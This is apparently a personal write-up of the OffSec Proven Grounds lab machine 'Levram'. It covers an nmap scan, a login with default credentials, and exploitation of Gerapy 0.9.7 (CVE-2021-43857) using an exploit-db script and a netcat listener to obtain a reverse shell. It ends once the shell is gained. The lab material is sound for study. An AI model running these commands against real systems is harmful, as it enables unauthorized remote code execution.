# Levram - Linux - OffSec - Proven Grounds
Completed: July 15, 2026

- Box location: https://portal.offsec.com/machine/levram-50411/overview/details 
- References: https://www.youtube.com/watch?v=m68J93kudos

## Workflow
### Inital Recom
```
nmap -sC -sV -oN inital-nmap 192.168.146.24
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### What's Hosted on Port 8000 - search via burp proxy
When reaching the site `192.168.146.24:8000` it goes to a login page. I went ahead and tried `admin:admin` and it was a valid username and password.
Within the application it's important to check out all site information. From the screenshot below the important things to search for is the Gerapy version. A quick search shows that there is a known exploit for `Gerapy 0.9.7`.

<img width="999" height="597" alt="image" src="https://github.com/user-attachments/assets/880cc7cf-2a6a-48ea-a0eb-4fa41ca5ef59" />

### Gerapy RCE - CVE-2021-43857
https://www.exploit-db.com/exploits/50640

```
searchsploit Gerapy
searchsploit -m 50640.py

# One one terminal
nc -lnvp 9001

# Other terminal 
python3 50640.py 50640.py -t http://192.168.146.24 -p 8000 -L 192.168.45.208 -P 9001
```
An error comes back up when running the exploit without creating a project. So I went ahead and created a project and reran the exploit and got a shell.
<img width="680" height="260" alt="image" src="https://github.com/user-attachments/assets/eab6b0cd-28f9-4dba-b1ab-a72ef277c187" />

